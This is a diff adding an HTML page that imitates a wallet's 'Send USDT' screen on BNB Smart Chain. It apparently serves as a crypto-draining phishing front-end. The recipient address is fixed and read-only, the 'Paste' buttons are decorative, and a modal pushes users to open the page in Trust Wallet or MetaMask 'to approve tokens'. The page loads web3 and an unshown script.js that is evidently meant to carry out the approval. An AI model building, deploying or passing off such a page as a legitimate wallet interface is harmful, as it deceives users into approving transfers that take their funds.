@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SEND USDT</title>
+    <link rel="icon" href="favicon.ico" type="image/x-icon" sizes="16x16">
+    
+    <!-- External Scripts -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
+    
+    <style>
+        /* Font Face Declarations */
+        @font-face {
+            font-family: Geist;
+            font-style: normal;
+            font-weight: 100 900;
+            font-display: swap;
+            src: url(data:font/woff2;base64,d09GMgABAAAAAASwAA0AAAAAB) format("woff2");
+        }
+
+        @font-face {
+            font-family: Geist Fallback;
+            src: local("Arial");
+            ascent-override: 95.94%;
+            descent-override: 28.16%;
+            line-gap-override: 0.00%;
+            size-adjust: 104.76%;
+        }
+
+        /* CSS Variables */
+        :root {
+            --bg: #071025;
+            --panel: rgba(255, 255, 255, 0.02);
+            --accent: #2563eb;
+            --accent-2: #7c5cff;
+            --text: #0b1220;
+            --muted: #6b7280;
+            --placeholder: rgba(230, 238, 248, 0.45);
+            --modal-bg: rgba(2, 6, 23, 0.75);
+            --danger: #ef4444;
+            --pill-border: #C0C4CB;
+            --color-blue-400: oklch(70.7% .165 254.624);
+            --color-blue-700: oklch(48.8% .243 264.376);
+            --color-blue-800: oklch(42.4% .199 265.638);
+            --color-gray-200: oklch(92.8% .006 264.531);
+            --color-gray-300: oklch(87.2% .01 258.338);
+            --color-gray-400: oklch(70.7% .022 261.325);
+            --color-gray-500: oklch(55.1% .027 264.364);
+            --color-gray-600: oklch(44.6% .03 256.802);
+            --color-gray-700: oklch(37.3% .034 259.733);
+            --color-gray-800: oklch(27.8% .033 256.848);
+            --color-black: #000;
+            --color-white: #fff;
+            --spacing: .25rem;
+            --text-sm: .875rem;
+            --text-sm--line-height: calc(1.25/.875);
+            --font-weight-medium: 500;
+            --font-weight-bold: 700;
+            --radius-md: .375rem;
+            --radius-3xl: 1.5rem;
+            --default-transition-duration: .15s;
+            --default-transition-timing-function: cubic-bezier(.4, 0, .2, 1);
+        }
+
+        /* Base Reset */
+        *, ::before, ::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        html {
+            -webkit-text-size-adjust: 100%;
+            tab-size: 4;
+            line-height: 1.5;
+            font-family: Geist, Geist Fallback, ui-sans-serif, system-ui, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            background: var(--color-white);
+            color: var(--text);
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        /* Destination Network Area */
+        .destination {
+            margin-top: -25px;
+            margin-bottom: -6px;
+        }
+
+        .network-pill {
+            margin-top: 8px;
+            display: inline-flex;
+            gap: 7px;
+            align-items: center;
+            border-radius: 50px;
+            border: 1.5px solid var(--pill-border);
+            background: #fff;
+            box-shadow: 0 6px 20px rgba(12, 20, 30, 0.03);
+            max-width: 100%;
+            width: auto;
+            box-sizing: border-box;
+            padding: 2px;
+        }
+
+        .network-logo {
+            width: 35px;
+            height: 35px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 8px;
+        }
+
+        .network-label {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-weight: 500;
+            color: var(--text);
+            font-size: 14px;
+        }
+
+        /* Dark mode network label fix */
+        @media (prefers-color-scheme: dark) {
+            .network-label {
+                color: var(--color-gray-200);
+            }
+        }
+
+        .down-arrow {
+            font-size: 16px;
+            color: var(--muted);
+            padding-right: 5px;
+            line-height: 1;
+            margin: 0;
+        }
+
+        /* Button Spinner */
+        .btn-spinner {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            border: 3px solid transparent;
+            border-top-color: #ff00c8;
+            border-right-color: #00eaff;
+            border-bottom-color: #aaff00;
+            border-left-color: #ffae00;
+            animation: spin 0.7s linear infinite;
+            display: inline-block;
+            margin-left: 10px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        #btntransfer:disabled {
+            background-color: #b3b3b3 !important;
+            color: #555 !important;
+            opacity: 0.6 !important;
+            cursor: not-allowed !important;
+        }
+
+        #btntransfer {
+            transition: all 0.25s ease;
+        }
+
+        /* Modal Styles */
+        .overlay {
+            position: fixed;
+            inset: 0;
+            background: var(--modal-bg);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            padding: 20px;
+        }
+
+        .overlay.show {
+            display: flex;
+        }
+
+        .modal {
+            width: 100%;
+            max-width: 420px;
+            background: linear-gradient(180deg, #061025, #071025);
+            border-radius: 14px;
+            padding: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            color: #e6eef8;
+            text-align: center;
+            position: relative;
+        }
+
+        .modal .close {
+            position: absolute;
+            right: 18px;
+            top: 16px;
+            background: transparent;
+            border: none;
+            color: #98a3bf;
+            font-size: 20px;
+            cursor: pointer;
+        }
+
+        .modal-illustration {
+            width: 56px;
+            height: 56px;
+            margin: 0 auto 8px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #ff758c, #ffb199);
+            box-shadow: 0 8px 30px rgba(255, 117, 140, 0.12);
+            font-size: 32px;
+        }
+
+        .modal h3 {
+            margin: 6px 0;
+            font-size: 18px;
+            color: #fff;
+        }
+
+        .modal p {
+            margin: 8px 0 18px 0;
+            color: #98a3bf;
+            font-size: 14px;
+        }
+
+        .modal .ok-btn {
+            padding: 10px 16px;
+            border-radius: 10px;
+            border: 0;
+            background: linear-gradient(90deg, var(--accent), var(--accent-2));
+            color: white;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        .modal .hint {
+            margin-top: 10px;
+            font-size: 12px;
+            color: #98a3bf;
+        }
+
+        /* Utility Classes */
+        .flex {
+            display: flex;
+        }
+
+        .flex-col {
+            flex-direction: column;
+        }
+
+        .flex-row {
+            flex-direction: row;
+        }
+
+        .items-center {
+            align-items: center;
+        }
+
+        .justify-between {
+            justify-content: space-between;
+        }
+
+        .gap-1 {
+            gap: calc(var(--spacing) * 1);
+        }
+
+        .gap-3 {
+            gap: calc(var(--spacing) * 3);
+        }
+
+        .gap-4 {
+            gap: calc(var(--spacing) * 4);
+        }
+
+        .h-screen {
+            height: 100vh;
+        }
+
+        .w-full {
+            width: 100%;
+        }
+
+        .mt-3 {
+            margin-top: calc(var(--spacing) * 3);
+        }
+
+        .mb-6 {
+            margin-bottom: calc(var(--spacing) * 6);
+        }
+
+        .p-1 {
+            padding: calc(var(--spacing) * 1);
+        }
+
+        .p-5 {
+            padding: calc(var(--spacing) * 5);
+        }
+
+        .px-3 {
+            padding-inline: calc(var(--spacing) * 3);
+        }
+
+        .py-2 {
+            padding-block: calc(var(--spacing) * 2);
+        }
+
+        .py-3 {
+            padding-block: calc(var(--spacing) * 3);
+        }
+
+        .py-4 {
+            padding-block: calc(var(--spacing) * 4);
+        }
+
+        .rounded-md {
+            border-radius: var(--radius-md);
+        }
+
+        .rounded-3xl {
+            border-radius: var(--radius-3xl);
+        }
+
+        .border {
+            border-style: solid;
+            border-width: 1px;
+        }
+
+        .border-gray-500 {
+            border-color: var(--color-gray-500);
+        }
+
+        .bg-white {
+            background-color: var(--color-white);
+        }
+
+        .bg-blue-800 {
+            background-color: var(--color-blue-800);
+        }
+
+        .bg-transparent {
+            background-color: transparent;
+        }
+
+        .text-sm {
+            font-size: var(--text-sm);
+            line-height: var(--text-sm--line-height);
+        }
+
+        .text-start {
+            text-align: start;
+        }
+
+        .font-medium {
+            font-weight: var(--font-weight-medium);
+        }
+
+        .font-bold {
+            font-weight: var(--font-weight-bold);
+        }
+
+        .text-gray-600 {
+            color: var(--color-gray-600);
+        }
+
+        .text-gray-700 {
+            color: var(--color-gray-700);
+        }
+
+        .text-gray-500 {
+            color: var(--color-gray-500);
+        }
+
+        .text-gray-800 {
+            color: var(--color-gray-800);
+        }
+
+        .text-blue-700 {
+            color: var(--color-blue-700);
+        }
+
+        .text-black {
+            color: var(--color-black);
+        }
+
+        .cursor-pointer {
+            cursor: pointer;
+        }
+
+        .shadow-lg {
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -4px rgba(0, 0, 0, 0.1);
+        }
+
+        .transition-colors {
+            transition-property: color, background-color, border-color;
+            transition-timing-function: var(--default-transition-timing-function);
+            transition-duration: var(--default-transition-duration);
+        }
+
+        .focus\:outline-none:focus {
+            outline: none;
+        }
+
+        input::placeholder {
+            color: var(--muted);
+            opacity: 0.7;
+        }
+
+        /* Dark Mode */
+        @media (prefers-color-scheme: dark) {
+            body {
+                background-color: #1A1A1A;
+            }
+
+            .bg-white {
+                background-color: #1A1A1A;
+            }
+
+            .text-gray-600 {
+                color: var(--color-gray-300);
+            }
+
+            .text-gray-700 {
+                color: var(--color-gray-200);
+            }
+
+            .text-gray-800 {
+                color: var(--color-gray-200);
+            }
+
+            .text-blue-700 {
+                color: #48FF91;
+            }
+
+            .bg-blue-800 {
+                background-color: #48FF91;
+            }
+
+            .text-black {
+                color: var(--color-black);
+            }
+
+            .border-gray-500 {
+                border-color: var(--color-gray-500);
+            }
+
+            input:not([readonly]) {
+                background-color: #232323;
+            }
+
+            .network-pill {
+                background-color: #232323;
+                border-color: #444;
+            }
+
+            input[readonly] {
+                background-color: #232323 !important;
+                color: var(--color-gray-300) !important;
+            }
+
+            .font-bold {
+                font-weight: var(--font-weight-medium);
+            }
+
+            .border-gray-500 {
+                background-color: #232323 !important;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="items-center">
+        <div class="flex flex-col justify-between h-screen w-full bg-white shadow-lg p-5 transition-colors">
+            <form class="flex flex-col gap-4">
+                <!-- Address Input -->
+                <label class="flex flex-col gap-1 mb-6 mt-3">
+                    <span class="font-medium text-sm text-start text-gray-600">Address or Domain Name</span>
+                    <div class="flex flex-row items-center rounded-md gap-3 border border-gray-500 p-1 transition-colors" style="background: #f5f5f5;">
+                        <input id="addr" type="text" class="w-full text-gray-700 rounded px-3 py-2" placeholder="0x..." readonly value="0x8334dCa021E6eD356a9afF5a82e524666dFb9eA2" style="cursor: not-allowed; background: transparent; border: none; outline: none; font-weight: 400;">
+                        <div class="flex flex-row gap-4">
+                            <span class="font-bold cursor-pointer text-sm text-blue-700">Paste</span>
+                            <span class="font-bold cursor-pointer text-sm text-blue-700">
+                                <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" height="16" width="16" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M436 160c6.6 0 12-5.4 12-12v-40c0-6.6-5.4-12-12-12h-20V48c0-26.5-21.5-48-48-48H48C21.5 0 0 21.5 0 48v416c0 26.5 21.5 48 48 48h320c26.5 0 48-21.5 48-48v-48h20c6.6 0 12-5.4 12-12v-40c0-6.6-5.4-12-12-12h-20v-64h20c6.6 0 12-5.4 12-12v-40c0-6.6-5.4-12-12-12h-20v-64h20zm-228-32c35.3 0 64 28.7 64 64s-28.7 64-64 64-64-28.7-64-64 28.7-64 64-64zm112 236.8c0 10.6-10 19.2-22.4 19.2H118.4C106 384 96 375.4 96 364.8v-19.2c0-31.8 30.1-57.6 67.2-57.6h5c12.3 5.1 25.7 8 39.8 8s27.6-2.9 39.8-8h5c37.1 0 67.2 25.8 67.2 57.6v19.2z"></path>
+                                </svg>
+                            </span>
+                            <span class="font-bold cursor-pointer text-sm text-blue-700">
+                                <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="16" width="16" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M136 384h56c4.4 0 8-3.6 8-8V200h176c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H196c-37.6 0-68 30.4-68 68v180c0 4.4 3.6 8 8 8zm512-184h176v176c0 4.4 3.6 8 8 8h56c4.4 0 8-3.6 8-8V196c0-37.6-30.4-68-68-68H648c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zM376 824H200V648c0-4.4-3.6-8-8-8h-56c-4.4 0-8 3.6-8 8v180c0 37.6 30.4 68 68 68h180c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm512-184h-56c-4.4 0-8 3.6-8 8v176H648c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h180c37.6 0 68-30.4 68-68V648c0-4.4-3.6-8-8-8zm16-164H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8z"></path>
+                                </svg>
+                            </span>
+                        </div>
+                    </div>
+                </label>
+
+                <!-- Destination Network -->
+                <div class="destination">
+                    <div style="font-size:13px; color:var(--muted); font-weight:700;">
+                        Destination Network
+                    </div>
+                    <div class="network-pill" role="button" tabindex="0" id="networkPill">
+                        <div class="network-logo">
+                            <img src="images/BNB-icon.png" alt="BNB Logo" width="30" height="30" style="display:block;">
+                        </div>
+                        <div style="display:flex; flex-direction:column; align-items:flex-start;">
+                            <div class="network-label">
+                                BNB Smart Chain
+                                <span class="down-arrow">▾</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Amount Input -->
+                <label class="flex flex-col gap-1">
+                    <span class="font-medium text-sm text-start text-gray-600">Amount</span>
+                    <div class="flex flex-row items-center rounded-md gap-3 border border-gray-500 p-1 transition-colors" style="background: white;">
+                        <input id="Input_USDT" type="number" class="w-full text-gray-700 rounded px-3 py-2" placeholder="Amount" min="0.10" required oninput="updateUSDValue()" style="background: transparent; border: none; outline: none; font-weight: 400;">
+                        <div class="flex flex-row gap-4 p-1">
+                            <span class="font-bold text-sm text-gray-500">USDT</span>
+                            <span class="font-bold cursor-pointer text-sm text-blue-700">Max</span>
+                        </div>
+                    </div>
+                    <span class="text-start text-gray-800 text-sm" id="usdValue">= $0.00</span>
+                </label>
+            </form>
+
+            <!-- Next Button -->
+            <button id="btntransfer" class="w-full bg-blue-800 rounded-3xl text-black py-4 cursor-pointer transition-colors" style="border: none; outline: none; font-size: 16px;" disabled>
+                Next
+            </button>
+        </div>
+    </div>
+
+    <!-- Modal for Wallet Messages -->
+    <div id="noWalletOverlay" class="overlay" role="dialog" aria-modal="true">
+        <div class="modal" role="document">
+            <button class="close" id="modalClose" aria-label="Close">✕</button>
+            <div class="modal-illustration">⚠️</div>
+            <h3 id="nwTitle">Please open this in a wallet browser</h3>
+            <p id="nwDesc">This page must be opened inside Trust Wallet or MetaMask's in-app browser to approve tokens.</p>
+            <button id="modalOk" class="ok-btn">OK</button>
+            <div class="hint">If you're on desktop, install MetaMask or open this page in your mobile wallet's browser.</div>
+        </div>
+    </div>
+
+    <!-- Link to Your Script -->
+    <script src="script.js"></script>
+    
+    <script type="text/javascript">
+        // Update USD value calculation
+        function updateUSDValue() {
+            const usdtAmount = parseFloat(document.getElementById('Input_USDT').value) || 0;
+            const usdValue = (usdtAmount * 0.99).toFixed(2);
+            document.getElementById('usdValue').textContent = '≈ $' + usdValue;
+            
+            // Enable/disable button based on input (minimum 0.10 USDT)
+            const btn = document.getElementById('btntransfer');
+            if (usdtAmount >= 0.10) {
+                btn.disabled = false;
+                btn.style.opacity = '1';
+            } else {
+                btn.disabled = true;
+                btn.style.opacity = '0.5';
+            }
+        }
+
+        // Auto-switch to BSC on page load
+        window.addEventListener('load', function() {
+            if (typeof autoSwitchToBSC === 'function') {
+                autoSwitchToBSC();
+            }
+        });
+
+        // Modal close functionality
+        document.getElementById('modalClose').addEventListener('click', function() {
+            document.getElementById('noWalletOverlay').classList.remove('show');
+        });
+
+        document.getElementById('modalOk').addEventListener('click', function() {
+            document.getElementById('noWalletOverlay').classList.remove('show');
+        });
+    </script>
+</body>
+</html>
